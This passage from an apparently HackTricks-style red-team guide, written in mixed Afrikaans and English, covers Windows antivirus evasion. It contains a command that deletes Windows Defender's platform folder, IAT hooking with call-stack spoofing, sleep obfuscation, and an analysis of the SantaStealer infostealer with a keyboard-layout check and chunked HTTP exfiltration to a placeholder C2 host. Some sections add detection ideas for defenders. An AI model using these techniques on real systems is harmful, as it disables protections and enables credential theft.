- Service kill/denial: Verwyder die version-symlink sodat by die volgende opstart die gekonfigureerde pad nie oplos nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Let op: Hierdie tegniek verskaf nie privilege escalation op sigself nie; dit vereis admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime evasion uit die C2 implant verskuif na die teikenmodule self deur sy Import Address Table (IAT) te hook en geselekteerde APIs deur attacker‑controlled, position‑independent code (PIC) te roeteer. Dit generaliseer evasion buite die klein API‑oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post‑exploitation DLLs.

High-level approach
- Stage 'n PIC blob langs die teikenmodule met 'n reflective loader (prepended of companion). Die PIC moet self‑contained en position‑independent wees.
- Terwyl die host DLL laai, loop sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) om na dun PIC wrappers te wys.
- Elke PIC wrapper voer evasions uit voordat dit die werklike API-adres tail‑call. Tipiese evasions sluit in:
  - Memory mask/unmask rondom die oproep (bv. encrypt beacon regions, RWX→RX, verander page names/permissions) en herstel daarna.
  - Call‑stack spoofing: konstrueer 'n benign stack en transisieer in die teiken API sodat call‑stack analise na verwagte frames oplos.
- Vir compatibility, exporteer 'n interface sodat 'n Aggressor script (of ekwivalent) kan registreer watter APIs vir Beacon, BOFs en post‑ex DLLs gehook moet word.

Why IAT hooking here
- Werk vir enige kode wat die gehookte import gebruik, sonder om tool code te wysig of op Beacon te staatmaak om spesifieke APIs te proxy.
- Dek post‑ex DLLs: hooking van LoadLibrary* laat jou toe om module loads (bv. System.Management.Automation.dll, clr.dll) te onderskep en dieselfde masking/stack evasion op hul API‑oproepe toe te pas.
- Herstel betroubare gebruik van process‑spawning post‑ex commands teen call‑stack–gebaseerde detections deur CreateProcessA/W te wrapp.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Aantekeninge
- Pas die patch toe ná relocations/ASLR en vóór die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking tydens die DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; los die werklike API op via die oorspronklike IAT-waarde wat jy voor patching gevang het of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en voorkom dat bladsye wat skryfbaar + uitvoerbaar is, agterbly.

Call‑stack spoofing stub
- Draugr‑styl PIC stubs bou 'n vals oproepketting (return-adresse na onskadelike modules) en draai dan na die werklike API.
- Dit verslaan deteksies wat verwag dat canonical stacks van Beacon/BOFs na sensitiewe APIs sal vertoon.
- Kombineer met stack cutting/stack stitching-tegnieke om binne die verwagte rame te beland voor die API-proloog.

Operational integration
- Voeg die reflective loader vóór post‑ex DLLs in sodat die PIC en hooks outomaties initialiseer wanneer die DLL gelaai word.
- Gebruik 'n Aggressor-script om teiken‑APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde evasion‑pad sonder kodering‑veranderings.

Detection/DFIR considerations
- IAT-integriteit: inskrywings wat na non‑image (heap/anon) adresse oplos; periodieke verifikasie van import‑pointers.
- Stack‑anomalieë: return‑adresse wat nie aan gelaaide images behoort nie; skielike oorgange na non‑image PIC; inkonsistente RtlUserThreadStart‑afkoms.
- Loader‑telemetrie: in‑process skrywings na IAT, vroeë DllMain‑aktiwiteit wat import thunks wysig, onverwagte RX‑streke geskep by lading.
- Image‑load evasion: as jy LoadLibrary* hook, monitor verdagte ladings van automation/clr assemblies wat met memory masking‑gebeure gekorreleer is.

Related building blocks and examples
- Reflective loaders wat IAT‑patching tydens lading uitvoer (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) en stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

As jy 'n reflective loader beheer, kan jy imports hook gedurende `ProcessImports()` deur die loader se `GetProcAddress` pointer te vervang met 'n custom resolver wat eers vir hooks kontroleer:

- Bou 'n **resident PICO** (persistent PIC object) wat oorleef nadat die transiënte loader PIC homself vrylaat.
- Export 'n `setup_hooks()` funksie wat die loader se import resolver oor-skryf (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, sla ordinal imports oor en gebruik 'n hash‑gebaseerde hook lookup soos `__resolve_hook(ror13hash(name))`. As 'n hook bestaan, gee dit terug; anders delegeer aan die werklike `GetProcAddress`.
- Registreer hook‑teikens by link‑tyd met Crystal Palace `addhook "MODULE$Func" "hook"` inskrywings. Die hook bly geldig omdat dit binne die resident PICO leef.

Dit lewer **import-time IAT redirection** sonder om die gelaaide DLL se code‑seksie na lading te patch.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks aktiveer slegs as die funksie werklik in die teiken se IAT is. As 'n module APIs oplos via 'n PEB‑walk + hash (geen import inskrywing nie), forceer 'n werklike import sodat die loader se `ProcessImports()`‑pad dit sien:

- Vervang gehashde export‑resolusie (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met 'n direkte verwysing soos `&WaitForSingleObject`.
- Die compiler emit 'n IAT‑inskrywing, wat onderskepping moontlik maak wanneer die reflective loader imports oplos.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC primitives** die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang wagte, draai die oproep in 'n Ekko‑style obfuscation‑ketting wat die in‑memory image tydens idle enkripteer:

- Gebruik `CreateTimerQueueTimer` om 'n reeks callbacks te skeduleer wat `NtContinue` met opgemaakte `CONTEXT`‑rame aanroep.
- Tipiese ketting (x64): stel image op `PAGE_READWRITE` → RC4 enkripteer via `advapi32!SystemFunction032` oor die volle gemapte image → voer die blocking wait uit → RC4 dekripteer → **herstel per‑seksie permissies** deur die PE‑seksies te deurloop → sein voltooiing.
- `RtlCaptureContext` verskaf 'n templaat `CONTEXT`; kloon dit in meerdere rame en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke stap aan te roep.

Operasionele detail: return “success” vir lang wagte (e.g., `WAIT_OBJECT_0`) sodat die aanroeper voortgaan terwyl die image gemasker is. Hierdie patroon verberg die module vir scanners tydens idle‑vensters en vermy die klassieke “patched `Sleep()`” handtekening.

Detection ideas (telemetry-based)
- Uitbarstings van `CreateTimerQueueTimer` callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` gebruik op groot aaneenlopende image‑grootte buffers.
- Groot‑bereik `VirtualProtect` gevolg deur custom per‑seksie toestemmingsherstel.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustreer hoe moderne info‑stealers AV bypass, anti‑analysis en credential access in 'n enkele workflow meng.

### Keyboard layout gating & sandbox delay

- 'n Config‑flag (`anti_cis`) enumereer geïnstalleerde keyboard layouts via `GetKeyboardLayoutList`. As 'n Kyrilliese layout gevind word, gooi die sample 'n leë `CIS` marker en beëindig voor dit stealers uitvoer, wat verseker dat dit nooit op uitgesluitde lokale ontplof nie terwyl dit 'n hunting artifact agterlaat.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Gelaagde `check_antivm` logika

- Variant A deurloop die proseslys, hasj elke naam met 'n pasgemaakte rollende checksum, en vergelyk dit teen ingebedde blocklists vir debuggers/sandboxes; dit herhaal die checksum oor die rekenaarnaam en kontroleer werkgidse soos `C:\analysis`.
- Variant B ondersoek stelsel-eienskappe (minimum proses-aantal, onlangse uptime), roep `OpenServiceA("VBoxGuest")` om VirtualBox additions te detecteer, en voer timing checks rondom sleeps uit om single-stepping op te spoor. Enige treffers breek af voordat modules begin.

### Fileless helper + double ChaCha20 reflective loading

- Die primêre DLL/EXE embeds 'n Chromium credential helper wat óf na skyf geskryf word óf manueel in-memory gemapped word; fileless-modus los imports/relocations self op sodat geen helper-artifakte geskryf word nie.
- Daardie helper berg 'n tweede-fase DLL wat twee keer met ChaCha20 geïnkripteer is (twee 32-byte sleutels + 12-byte nonces). Na beide passies laai dit die blob reflectively (geen `LoadLibrary`) en roep exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` af wat van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) afgelei is.
- Die ChromElevator-roetines gebruik direct-syscall reflective process hollowing om in 'n lewende Chromium-browser te inject, AppBound Encryption-sleutels te erf, en wagwoorde/cookies/credit cards direk uit SQLite-databasisse te ontsleutel ondanks ABE hardening.

### Modulêre in-memory versameling & chunked HTTP exfil

- `create_memory_based_log` iterateer oor 'n globale `memory_generators` funksie-pointer tabel en spawns een thread per geaktiveerde module (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Elke thread skryf resultate in gedeelde buffers en rapporteer sy lêertelling na 'n ~45s join-venster.
- As dit klaar is, word alles gezip met die staties gelinkte `miniz` library as `%TEMP%\\Log.zip`. `ThreadPayload1` slaap dan 15s en stream die argief in 10 MB chunks via HTTP POST na `http://<C2>:6767/upload`, en spoofs 'n browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Elke chunk voeg `User-Agent: upload`, `auth: <build_id>`, opsioneel `w: <campaign_tag>`, by, en die laaste chunk heg `complete: true` sodat die C2 weet herbou is klaar.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
